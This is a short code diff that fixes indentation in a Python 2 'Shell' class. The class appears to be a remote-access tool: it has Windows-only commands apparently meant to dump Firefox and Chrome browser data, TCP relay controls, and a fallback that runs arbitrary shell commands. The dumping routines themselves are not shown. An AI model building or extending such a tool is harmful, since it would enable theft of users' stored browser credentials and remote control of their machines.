@@ -145,13 +145,13 @@ class Shell:
 		print "ass1"
 		return "ass"
 
-        @windows_only
-        def dumpff(self):
-	    return dumpff.main()
+	@windows_only
+	def dumpff(self):
+		return dumpff.main()
        
-        @windows_only
-        def dumpchrome(self):
-            return dumpchrome.main()
+	@windows_only
+	def dumpchrome(self):
+		return dumpchrome.main()
 
 	def change_directory(self, dir):
 		try:
@@ -250,10 +250,10 @@ class Shell:
 				output = self.create_tcp_relay()
 			elif arguments == "stop":
 				output = self.stop_tcp_relay()
-                elif command == "dumpff":
-                        output = self.dumpff()
+		elif command == "dumpff":
+			output = self.dumpff()
 		elif command == "dumpchrome":
-		        output = self.dumpchrome()
+			output = self.dumpchrome()
 		else:
 			output = self.execute_shell_command(command+" "+arguments)
 			
